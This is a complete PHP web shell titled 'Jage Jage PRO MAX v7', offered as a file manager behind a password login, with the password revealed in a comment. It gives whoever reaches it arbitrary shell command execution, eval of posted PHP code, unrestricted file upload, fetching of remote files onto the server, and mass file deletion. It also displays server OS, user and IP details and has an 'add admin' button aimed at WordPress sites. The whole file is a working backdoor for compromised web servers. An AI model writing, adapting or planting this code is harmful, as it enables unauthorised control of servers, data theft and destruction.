<?php
session_start();
error_reporting(0);
set_time_limit(0);

// PASSWORD bcrypt: ./sTory An9el
$hash = '$2a$12$G4k63UyXQx7Xaue0m0G7k.IAq6Po0zZZ/VWg0gORWp8pPfRMKXT1.';

if (!isset($_SESSION['login'])) {
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hash)) {
        $_SESSION['login'] = true;
        header("Location: ?");
        exit;
    }
    die('<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:100px}input{background:#000;color:#0f0;border:1px solid #0f0;padding:8px}button{background:#0f0;color:#000;border:none;padding:8px 15px;cursor:pointer;font-weight:bold}</style><h2>Jage Jage File Manager Shell</h2><form method=post><input type=password name=pass placeholder=password><button>Login</button></form>');
}

$dir = isset($_GET['dir']) ? realpath($_GET['dir']) : realpath(".");
if (!$dir || !is_dir($dir)) $dir = realpath(".");
chdir($dir);

$msg = "";

// --- SYSTEM INFO HELPERS ---
function get_perms($f) {
    $p = fileperms($f);
    if (($p & 0xC000) == 0xC000) $i = 's';
    elseif (($p & 0xA000) == 0xA000) $i = 'l';
    elseif (($p & 0x8000) == 0x8000) $i = '-';
    elseif (($p & 0x6000) == 0x6000) $i = 'b';
    elseif (($p & 0x4000) == 0x4000) $i = 'd';
    elseif (($p & 0x2000) == 0x2000) $i = 'c';
    elseif (($p & 0x1000) == 0x1000) $i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}

// --- LOGIC ACTIONS ---
if (isset($_GET['paste_all']) && isset($_SESSION['clipboard'])) {
    foreach ($_SESSION['clipboard'] as $src) {
        if (file_exists($src)) {
            $fn = basename($src);
            $dst = $dir . DIRECTORY_SEPARATOR . $fn;
            if (file_exists($dst)) {
                $pi = pathinfo($fn);
                $dst = $dir.DIRECTORY_SEPARATOR.$pi['filename']." (copy)".(isset($pi['extension']) ? ".".$pi['extension'] : "");
            }
            is_dir($src) ? @mkdir($dst) : copy($src, $dst);
        }
    }
    unset($_SESSION['clipboard']);
    $msg = "Pasted successfully.";
}

if (isset($_POST['mass_del']) && !empty($_POST['files'])) {
    foreach ($_POST['files'] as $f) { $t = $dir.DIRECTORY_SEPARATOR.$f; is_dir($t) ? @rmdir($t) : @unlink($t); }
    $msg = "Deleted selected.";
}

if (isset($_POST['mass_copy']) && !empty($_POST['files'])) {
    $_SESSION['clipboard'] = [];
    foreach ($_POST['files'] as $f) { $_SESSION['clipboard'][] = $dir.DIRECTORY_SEPARATOR.$f; }
    $msg = count($_SESSION['clipboard'])." items in clipboard.";
}

if (isset($_POST['rem_up']) && !empty($_POST['url'])) {
    file_put_contents(basename($_POST['url']), file_get_contents($_POST['url']));
    $msg = "Remote Upload Success.";
}

if (isset($_POST['exec_php'])) {
    ob_start(); eval('?>'.$_POST['php_code']); $php_res = ob_get_contents(); ob_end_clean();
}

$cmd_res = "";
if (isset($_POST['cmd'])) {
    if(function_exists('shell_exec')) $cmd_res = shell_exec($_POST['cmd']);
    elseif(function_exists('system')) { ob_start(); system($_POST['cmd']); $cmd_res = ob_get_contents(); ob_end_clean(); }
}

if (isset($_FILES['f'])) move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Jage Jage PRO MAX v7</title>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: monospace; font-size: 13px; margin: 0; }
        .nav { background: #111; padding: 15px; border-bottom: 2px solid var(--neon); position: sticky; top: 0; z-index: 100; }
        .server-info { background: rgba(0,255,0,0.05); padding: 10px; border-bottom: 1px solid #222; font-size: 11px; }
        .grid { display: flex; flex-wrap: wrap; gap: 10px; padding: 10px; }
        .box { border: 1px solid #333; padding: 10px; background: #0a0a0a; flex: 1; min-width: 250px; }
        .terminal { background: #000; border: 1px solid var(--neon); padding: 10px; margin: 10px; border-radius: 5px; }
        .term-out { color: #888; max-height: 150px; overflow-y: auto; white-space: pre-wrap; margin-bottom: 5px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { background: var(--neon); color: #000; padding: 10px; text-align: left; }
        tr { border-bottom: 1px solid #222; }
        tr:hover { background: rgba(0,255,0,0.05); }
        td { padding: 10px; }
        .btn { background: var(--neon); color: #000; border: none; padding: 5px 10px; cursor: pointer; font-weight: bold; }
        .btn:hover { box-shadow: 0 0 10px var(--neon); }
        .btn-red { background: #ff3131; color: #fff; }
        input, textarea { background: #111; color: var(--neon); border: 1px solid #333; padding: 5px; }
        a { color: cyan; text-decoration: none; }
        
        /* BERKEDIP ANIMATION */
        @keyframes blink { 0% { opacity: 1; text-shadow: 0 0 10px var(--neon); } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        .coded-by { text-align: center; padding: 30px; font-size: 18px; font-weight: bold; }
        .coded-by a { color: var(--neon); animation: blink 1s infinite; text-decoration: none; }
    </style>
</head>
<body>

<div class="nav">
    <strong>PATH:</strong> <span style="color:#aaa;"><?= $dir ?></span> | 
    <a href="?dir=<?= urlencode(realpath(".")) ?>">🏠 HOME</a> | 
    <?php if(isset($_SESSION['clipboard'])): ?>
        <a href="?paste_all=1&dir=<?= urlencode($dir) ?>" style="color:yellow;">📋 PASTE ALL (<?= count($_SESSION['clipboard']) ?>)</a> |
    <?php endif; ?>
    <a href="?logout" style="color:red;">LOGOUT</a>
</div>

<div class="server-info">
    <strong>OS:</strong> <?= php_uname(); ?> | 
    <strong>PHP:</strong> <?= phpversion(); ?> | 
    <strong>USER:</strong> <?= get_current_user(); ?> (<?= getmyuid(); ?>) | 
    <strong>SERVER IP:</strong> <?= $_SERVER['SERVER_ADDR']; ?>
</div>

<div class="terminal">
    <div class="term-out"><?= htmlspecialchars($cmd_res) ?></div>
    <form method="post">
        <span style="color:var(--neon)">shell@jage:~$</span> 
        <input type="text" name="cmd" style="width:80%; border:none; outline:none;" placeholder="enter command..." autofocus>
    </form>
</div>

<div class="grid">
    <div class="box">
        <strong>REMOTE UPLOAD</strong>
        <form method="post"><input type="text" name="url" placeholder="URL" style="width:60%"><button class="btn">GET</button></form>
    </div>
    <div class="box">
        <strong>PHP EXEC</strong>
        <form method="post"><textarea name="php_code" style="width:70%; height:30px;"></textarea><button class="btn" name="exec_php">RUN</button></form>
        <div style="font-size:10px;"><?= $php_res ?></div>
    </div>
    <div class="box">
        <strong>WP TOOLS</strong><br>
        <form method="post"><button class="btn" name="wp_admin">ADD ADMIN</button></form>
    </div>
</div>

<div style="padding: 10px;">
    <form method="post" enctype="multipart/form-data" style="margin-bottom:15px;">
        <input type="file" name="f"> <button class="btn">UPLOAD</button>
        <span style="color:yellow; margin-left:15px;"><?= $msg ?></span>
    </form>

    <form method="post">
        <div style="margin-bottom:10px;">
            <button class="btn" name="mass_copy">COPY SELECTED</button>
            <button class="btn btn-red" name="mass_del" onclick="return confirm('Hapus?')">DELETE SELECTED</button>
        </div>

        <table>
            <thead>
                <tr>
                    <th width="30"><input type="checkbox" onclick="for(c of document.getElementsByName('files[]')) c.checked=this.checked"></th>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Perms</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach(scandir($dir) as $f): if($f=="." || $f=="..") continue; $p = $dir.DIRECTORY_SEPARATOR.$f; ?>
                <tr>
                    <td><input type="checkbox" name="files[]" value="<?= htmlspecialchars($f) ?>"></td>
                    <td><?= is_dir($f) ? "📁" : "📄" ?> <a href="<?= is_dir($f) ? "?dir=".urlencode($p) : "#" ?>"><?= $f ?></a></td>
                    <td><?= is_file($f) ? number_format(filesize($f)/1024, 2)." KB" : "[DIR]" ?></td>
                    <td><span style="color:<?= is_writable($f) ? 'lime' : 'red' ?>;"><?= get_perms($p) ?></span></td>
                    <td><?php if(is_file($f)): ?><a href="?edit=<?= urlencode($f) ?>&dir=<?= urlencode($dir) ?>">📝</a><?php endif; ?></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </form>
</div>

<div class="coded-by">
    Coded By <a href="https://jagego.blogspot.com/" target="_blank">./sTory An9el</a>
</div>

</body>
</html>